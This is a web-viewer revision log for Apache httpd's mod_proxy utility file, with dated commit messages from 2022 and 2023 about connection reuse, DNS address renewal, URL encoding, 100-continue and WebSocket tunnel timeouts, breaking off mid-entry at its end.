File length: 215258 byte(s)

Diff to [previous 1912461](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1912461&r2=1912462)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1912461&r2=1912462&diff_format=h))
```
mod_proxy: Simplify ap_proxy_get_worker_ex()

Factorize duplicated code in the balancer and non-balancer cases by adding
a new worker_matches() helper.

No functional change intended.

```

---

Revision [**1912461**](/viewvc?view=revision&revision=1912461) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1912461&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1912461&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1912461))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1912461)

Modified
*Thu Sep 21 13:31:15 2023 UTC*
(16 months ago)
by *ylavic*

File length: 215737 byte(s)

Diff to [previous 1912460](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1912460&r2=1912461)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1912460&r2=1912461&diff_format=h))
```
mod_proxy: Add ap_proxy_worker_get_name() and deprecate ap_proxy_worker_name().

The latter requires a pool and returns a non constant string although it may
return worker shared data.

By computing the worker "UDS" name at init time we can return a constant name
in any case with no need for a pool, that's the new ap_proxy_worker_get_name().

```

---

Revision [**1912460**](/viewvc?view=revision&revision=1912460) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1912460&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1912460&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1912460))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1912460)

Modified
*Thu Sep 21 13:24:28 2023 UTC*
(16 months ago)
by *ylavic*

File length: 215661 byte(s)

Diff to [previous 1912459](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1912459&r2=1912460)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1912459&r2=1912460&diff_format=h))
```
mod_proxy: Consistently close the socket on failure to reuse the connection.

proxy_connection_create() and ap_proxy_connect_backend() sometimes close the
connection on failure, sometimes not. Always close it.

```

---

Revision [**1912459**](/viewvc?view=revision&revision=1912459) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1912459&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1912459&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1912459))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1912459)

Modified
*Thu Sep 21 13:15:35 2023 UTC*
(16 months ago)
by *ylavic*

File length: 215497 byte(s)

Diff to [previous 1912245](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1912245&r2=1912459)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1912245&r2=1912459&diff_format=h))
```
mod_proxy: Handle backend address renewal with address_ttl= parameter.

Define a new proxy_address struct holding the current/latest sockaddr in use
by each proxy worker and conn. Since backend addresses can be updated when
their TTL expires and while connections are being processed, each address is
refcounted and freed only when the last worker (or conn) using it grabs the
new one.

The lifetime of the addresses is handled at a single place by the new
ap_proxy_determine_address() function. It guarantees to bind the current/latest
backend address to the passed in conn (or do nothing if it's up to date already).
The function is called indirectly by ap_proxy_determine_connection() for the
proxy modules that use it, or directly by mod_proxy_ftp and mod_proxy_hcheck.
It also is called eventually by ap_proxy_connect_backend() when connect()ing all
the current addresses fails, to check (PROXY_DETERMINE_ADDRESS_CHECK) if some
new addrs are available.

This commit is also a rework of the lifetime of conn->addr, conn->hostname
and conn->forward, using the conn->uds_pool and conn->fwd_pool for the cases
where the backend is connected through a UDS socket and a remote CONNECT proxy
respectively.

* include/ap_mmn.h:
  Minor bump for new function/fields.

* modules/proxy/mod_proxy.h (struct proxy_address,
                             ap_proxy_determine_addresss()):
  Declare ap_proxy_determine_addresss() and opaque struct proxy_address,
  new fields to structs proxy_conn_rec/proxy_worker_shared/proxy_worker.

* modules/proxy/mod_proxy.c (set_worker_param):
  Parse/set the new worker->address_ttl parameter.

* modules/proxy/proxy_util.c (proxy_util_register_hooks(),
                              ap_proxy_initialize_worker(),
                              ap_proxy_connection_reusable(),
                              ap_proxyerror(), proxyerror_core(),
                              init_conn_pool(), make_conn_subpool(),
                              connection_make(), connection_cleanup(),
                              connection_constructor()):
 Initialize *proxy_start_time in proxy_util_register_hooks() as the epoch
 from which expiration times are relative (i.e. seconds stored in an uint32_t
 for atomic changes).
 Make sure worker->s->is_address_reusable and worker->s->disablereuse are
 consistant in ap_proxy_initialize_worker(), thus no need to check for both
 in ap_proxy_connection_reusable().
 New proxyerror_core() helper taking an apr_status_t to log, wrap in
 ap_proxyerror().
 New make_conn_subpool() to create worker->cp->{pool,dns} with their own
 allocator.
 New connection_make() helper to factorize code in connection_cleanup() and
 connection_constructor().

* modules/proxy/proxy_util.c (proxy_address_inc(), proxy_address_dec(),
                              proxy_address_cleanup(), proxy_address_set_expired(),
                              worker_address_get(), worker_address_set(),
                              worker_address_resolve(), proxy_addrs_equal(),
                              ap_proxy_determine_address(),
                              ap_proxy_determine_connection(),
                              ap_proxy_connect_backend()):
 Implement ap_proxy_determine_address() using the above helpers for atomic changes,
 and call it from ap_proxy_determine_connection() and ap_proxy_connect_backend().

* modules/proxy/mod_proxy_ftp.c (proxy_ftp_handler):
  Use ap_proxy_determine_address() and use the returned backend->addr.

* modules/proxy/mod_proxy_hcheck.c (hc_determine_connection, hc_get_backend,
                                    hc_init_worker, hc_watchdog_callback):
  Use ap_proxy_determine_address() in hc_determine_connection() and call the
  latter from hc_get_backend(), replace hc_init_worker() by hc_init_baton()
  which now calls hc_get_hcworker() and hc_get_backend() to resolve the first
  address at init time.

* modules/proxy/mod_proxy_http.c (proxy_http_handler):
  Use backend->addr and ->hostname instead of worker->cp->addr and
  worker->s->hostname_ex respectively.

* modules/proxy/mod_proxy_ajp.c (ap_proxy_ajp_request):
  Use backend->addr and ->hostname instead of worker->cp->addr and
  worker->s->hostname_ex respectively.

Closes #367

```

---

Revision [**1912245**](/viewvc?view=revision&revision=1912245) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1912245&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1912245&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1912245))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1912245)

Modified
*Mon Sep 11 13:50:21 2023 UTC*
(16 months, 2 weeks ago)
by *jfclere*

File length: 199469 byte(s)

Diff to [previous 1910809](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1910809&r2=1912245)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1910809&r2=1912245&diff_format=h))
```
Arrange the bybusyness logic and prevent bad busy values
this closes #383

```

---

Revision [**1910809**](/viewvc?view=revision&revision=1910809) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1910809&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1910809&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1910809))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1910809)

Modified
*Thu Jul 6 07:44:21 2023 UTC*
(18 months, 3 weeks ago)
by *icing*

File length: 195100 byte(s)

Diff to [previous 1910704](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1910704&r2=1910809)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1910704&r2=1910809&diff_format=h))
```
proxy_util: revert timeout selection on a proxy tunnel back to
take the large of client/origin values.

Add websocket test to verify that longer proxypass timeout is in
effect.

```

---

Revision [**1910704**](/viewvc?view=revision&revision=1910704) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1910704&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1910704&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1910704))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1910704)

Modified
*Fri Jun 30 09:08:23 2023 UTC*
(18 months, 3 weeks ago)
by *icing*

File length: 195101 byte(s)

Diff to [previous 1910507](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1910507&r2=1910704)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1910507&r2=1910704&diff_format=h))
```
proxy: in proxy tunnels, use the smaller timeout value of
       client and origin as timeout for polling the tunnel.

```

---

Revision [**1910507**](/viewvc?view=revision&revision=1910507) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1910507&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1910507&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1910507))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1910507)

Modified
*Tue Jun 20 12:01:09 2023 UTC*
(19 months, 1 week ago)
by *icing*

File length: 195098 byte(s)

Diff to [previous 1909464](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1909464&r2=1910507)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1909464&r2=1910507&diff_format=h))
```
  *) mod_http2: added support for bootstrapping WebSockets via HTTP/2, as
     described in RFC 8441. A new directive 'H2WebSockets on|off' has been
     added. The feature is by default not enabled.
     As also discussed in the manual, this feature should work for setups
     using "ProxyPass backend-url upgrade=websocket" without further changes.
     Special server modules for WebSockets will have to be adapted,
     most likely, as the handling if IO events is different with HTTP/2.
     HTTP/2 WebSockets are supported on platforms with native pipes. This
     excludes Windows.

```

---

Revision [**1909464**](/viewvc?view=revision&revision=1909464) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1909464&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1909464&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1909464))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1909464)

Modified
*Fri Apr 28 06:20:27 2023 UTC*
(20 months, 4 weeks ago)
by *rpluem*

File length: 192850 byte(s)

Diff to [previous 1909451](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1909451&r2=1909464)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1909451&r2=1909464&diff_format=h))
```
* In the reverse proxy case when we only want to keep encoded slashes untouched
  we can have decoded '%''s in the URI that got sent to us in the original URL
  as %25. Don't error out in this case but just fall through and have them
  encoded to %25 when forwarding to the backend.

PR: 66580

```

---

Revision [**1909451**](/viewvc?view=revision&revision=1909451) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1909451&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1909451&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1909451))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1909451)

Modified
*Thu Apr 27 08:15:20 2023 UTC*
(21 months ago)
by *rpluem*

File length: 192265 byte(s)

Diff to [previous 1909402](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1909402&r2=1909451)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1909402&r2=1909451&diff_format=h))
```
* If we fail to connect to all looked up IP's from the worker lookup cache it
  might be caused by a change on DNS side. Try another DNS lookup in this case
  and in case this causes a successful connection trigger a refresh of the
  worker lookup cache.

```

---

Revision [**1909402**](/viewvc?view=revision&revision=1909402) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1909402&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1909402&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1909402))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1909402)

Modified
*Tue Apr 25 12:04:09 2023 UTC*
(21 months ago)
by *rpluem*

File length: 190932 byte(s)

Diff to [previous 1909401](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1909401&r2=1909402)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1909401&r2=1909402&diff_format=h))
```
* Rephrase comment [skip ci]

```

---

Revision [**1909401**](/viewvc?view=revision&revision=1909401) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1909401&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1909401&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1909401))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1909401)

Modified
*Tue Apr 25 11:57:22 2023 UTC*
(21 months ago)
by *rpluem*

File length: 190918 byte(s)

Diff to [previous 1909400](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1909400&r2=1909401)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1909400&r2=1909401&diff_format=h))
```
* Clear the dns_pool before to avoid a memory leak in case we did the lookup
  again.

```

---

Revision [**1909400**](/viewvc?view=revision&revision=1909400) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1909400&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1909400&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1909400))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1909400)

Modified
*Tue Apr 25 11:52:17 2023 UTC*
(21 months ago)
by *rpluem*

File length: 190709 byte(s)

Diff to [previous 1908628](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1908628&r2=1909400)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1908628&r2=1909400&diff_format=h))
```
* For retriggering a DNS lookup worker->cp->addr should be set to NULL and thus
  we need to avoid a race that worker->cp->addr switches to NULL after we
  checked it to be non NULL but before we assign it to conn->addr in an else
  tree which would leave conn->addr to NULL and likely cause a segfault later.

```

---

Revision [**1908628**](/viewvc?view=revision&revision=1908628) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1908628&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1908628&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1908628))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1908628)

Modified
*Wed Mar 22 08:01:31 2023 UTC*
(22 months ago)
by *rpluem*

File length: 190288 byte(s)

Diff to [previous 1908341](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1908341&r2=1908628)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1908341&r2=1908628&diff_format=h))
```
* Whitespace fixes. No functional change.

```

---

Revision [**1908341**](/viewvc?view=revision&revision=1908341) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1908341&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1908341&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1908341))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1908341)

Modified
*Mon Mar 13 10:24:30 2023 UTC*
(22 months, 2 weeks ago)
by *rpluem*

File length: 190287 byte(s)

Diff to [previous 1907565](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1907565&r2=1908341)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1907565&r2=1908341&diff_format=h))
```
Do not double encode encoded slashes

In case that AllowEncodedSlashes is set to NoDecode do not double encode
encoded slashes in the URL sent by the reverse proxy to the backend.

* include/ap_mmn.h: Document the addition of ap_proxy_canonenc_ex to the API.

* modules/proxy/mod_proxy.h: Declare ap_proxy_canonenc_ex and define flag
      values.

* modules/proxy/proxy_util.c: Implement ap_proxy_canonenc_ex by modifying
      ap_proxy_canonenc accordingly and reimplement ap_proxy_canonenc to
      use ap_proxy_canonenc_ex with the appropriate flag.

* modules/http2/mod_proxy_http2.c, modules/proxy/mod_proxy_*.c: Set the
      correct flag based on the AllowEncodedSlashes configuration and use
      ap_proxy_canonenc_ex instead of ap_proxy_canonenc.

```

---

Revision [**1907565**](/viewvc?view=revision&revision=1907565) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1907565&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1907565&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1907565))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1907565)

Modified
*Fri Feb 10 16:17:54 2023 UTC*
(23 months, 2 weeks ago)
by *rpluem*

File length: 189175 byte(s)

Diff to [previous 1904513](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1904513&r2=1907565)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1904513&r2=1907565&diff_format=h))
```
* Optimize code: We know that we already have a valid encoding string,
  because we just decoded it. Hence just copy what we have instead of
  redoing it.

```

---

Revision [**1904513**](/viewvc?view=revision&revision=1904513) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1904513&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1904513&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1904513))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1904513)

Modified
*Tue Oct 11 09:53:04 2022 UTC*
(2 years, 3 months ago)
by *ylavic*

File length: 189147 byte(s)

Diff to [previous 1901497](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1901497&r2=1904513)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1901497&r2=1904513&diff_format=h))
```
mod_proxy: Ignore (and warn about) enablereuse=on for ProxyPassMatch when
           some dollar substitution (backreference) happens in the hostname
           or port part of the URL.

Address or connection reuse can't work when the autority part of the URL is
dynamic (single origin server[:port] handled/assumed in the reslist). Detect
such cases and unset worker->s->is_address_reusable to disable reuse regardless
of enablereuse/disablereuse.

* modules/proxy/proxy_util.c(ap_proxy_define_worker_ex):
  Lookup for $n substitution in the hostname[:port] when parsing the URL and
  if present, set worker->->is_address_reusable=0 / worker->s->disablereuse=1.

* modules/proxy/proxy_util.c(ap_proxy_initialize_worker):
  Don't overwrite worker->s->is_address_reusable from enablereuse/disablereuse
  parameters, and set both consistently.

* docs/manual/mod/mod_proxy.xml:
  Add ProxyPassMatch compatibility note about key=value parameters handled with
  $n substitutions since 2.4.47.
  Document the specificities of enablereuse/disablereuse w.r.t. $n subsitutions
  in the different part of the URL.
  Axe the note about unparsable URLs when the $n substitution happens in the
  port, this has been addressed in 2.4.47 too (and works now).

```

---

Revision [**1901497**](/viewvc?view=revision&revision=1901497) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1901497&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1901497&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1901497))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1901497)

Modified
*Wed Jun 1 12:30:46 2022 UTC*
(2 years, 7 months ago)
by *covener*

File length: 187133 byte(s)

Diff to [previous 1901486](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1901486&r2=1901497)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1901486&r2=1901497&diff_format=h))
```
use a liberal default limit for LimitRequestBody of 1GB

```

---

Revision [**1901486**](/viewvc?view=revision&revision=1901486) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1901486&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1901486&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1901486))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1901486)

Modified
*Wed Jun 1 10:23:31 2022 UTC*
(2 years, 7 months ago)
by *ylavic*

File length: 187755 byte(s)

Diff to [previous 1901485](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1901485&r2=1901486)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1901485&r2=1901486&diff_format=h))
```
mod_proxy: Follow up to [r1901485](/viewvc?view=revision&revision=1901485): Don't shadow upper 'val' variable.

```

---

Revision [**1901485**](/viewvc?view=revision&revision=1901485) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1901485&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1901485&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1901485))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1901485)

Modified
*Wed Jun 1 09:56:43 2022 UTC*
(2 years, 7 months ago)
by *ylavic*

File length: 187771 byte(s)

Diff to [previous 1901461](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1901461&r2=1901485)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1901461&r2=1901485&diff_format=h))
```
mod_proxy: Let fixup hooks know about the Host header (and eventually overwrite it).

If proxy_run_fixups() sets a Host header there will be two ones sent to the
origin server.

Instead, let the hooks know about the Host by setting it in the r->headers_in
passed to proxy_run_fixups(), and use the actual value afterwards.
Note: if proxy_run_fixups() unsets the Host we'll keep ours.

Suggested by: rpluem

```

---

Revision [**1901461**](/viewvc?view=revision&revision=1901461) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1901461&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1901461&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1901461))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1901461)

Modified
*Tue May 31 15:26:12 2022 UTC*
(2 years, 7 months ago)
by *ylavic*

File length: 187409 byte(s)

Diff to [previous 1901460](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1901460&r2=1901461)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1901460&r2=1901461&diff_format=h))
```
mod_proxy: ap_proxy_create_hdrbrgd() to clear hop-by-hop first and fixup last.

So that ap_proxy_clear_connection() runs on the original headers only and
proxy_run_fixups() on the final ones.

```

---

Revision [**1901460**](/viewvc?view=revision&revision=1901460) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1901460&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1901460&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1901460))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1901460)

Modified
*Tue May 31 15:06:13 2022 UTC*
(2 years, 7 months ago)
by *ylavic*

File length: 187375 byte(s)

Diff to [previous 1901446](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1901446&r2=1901460)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1901446&r2=1901460&diff_format=h))
```
mod_proxy: Align ap_proxy_create_hdrbrgd() with 2.4.x's.

In 2.4.x, the copy of r->headers_in is left in r->headers_in for the whole
function, while the original r->headers_in are restored at the end. This
is simpler and avoids the r->headers_in <=> saved_headers_in danse when
calling a function that modifies r->headers_in in place.

Align with 2.4.x, no functional change.

```

---

Revision [**1901446**](/viewvc?view=revision&revision=1901446) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1901446&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1901446&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1901446))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1901446)

Modified
*Tue May 31 11:05:41 2022 UTC*
(2 years, 7 months ago)
by *ylavic*

File length: 187432 byte(s)

Diff to [previous 1901420](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1901420&r2=1901446)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1901420&r2=1901446&diff_format=h))
```
mod_proxy_http: Follow up to [r1901420](/viewvc?view=revision&revision=1901420): consistent 100-continue checks.

Let proxy_http_handler() tell ap_proxy_create_hdrbrgd() whether to add or
preserve Expect header or not, through the "proxy-100-continue" note.

```

---

Revision [**1901420**](/viewvc?view=revision&revision=1901420) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1901420&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1901420&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1901420))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1901420)

Modified
*Mon May 30 15:54:34 2022 UTC*
(2 years, 7 months ago)
by *ylavic*

File length: 187260 byte(s)

Diff to [previous 1900028](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1900028&r2=1901420)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1900028&r2=1901420&diff_format=h))
```
mod_proxy_http: Avoid 417 responses for non forwardable 100-continue. PR 65666.

Stop returning 417 when mod_proxy has to forward an HTTP/1.1 request with both
"Expect: 100-continue" and "force-proxy-request-1.0" set, mod_proxy can instead
handle the 100-continue by itself before forwarding the request, like in the
"Proxy100Continue Off" case.

Note that this does not change the behaviour of httpd receiving an HTTP/1.0
request with an Expect header, ap_check_request_header() will still correctly
return 417 in this case.

```

---

Revision [**1900028**](/viewvc?view=revision&revision=1900028) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1900028&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1900028&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1900028))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1900028)

Modified
*Tue Apr 19 09:14:10 2022 UTC*
(2 years, 9 months ago)
by *rjung*

File length: 187397 byte(s)

Diff to [previous 1899550](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1899550&r2=1900028)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1899550&r2=1900028&diff_format=h))
```
  *) mod_proxy: Add backend port to log messages to
     ease identification of involved service.

```

---

Revision [**1899550**](/viewvc?view=revision&revision=1899550) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1899550&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1899550&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1899550))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1899550)

Modified
*Mon Apr 4 09:41:25 2022 UTC*
(2 years, 9 months ago)
by *icing*

File length: 186522 byte(s)

Diff to [previous 1899547](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1899547&r2=1899550)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1899547&r2=1899550&diff_format=h))
```
  *) core: add ap_h1_append_header() for single header values.
  *) mod_proxy: use of new ap_h1_header(s) functions for
     formatting HTTP/1.1 requests.

```

---

Revision [**1899547**](/viewvc?view=revision&revision=1899547) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1899547&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1899547&view=co))
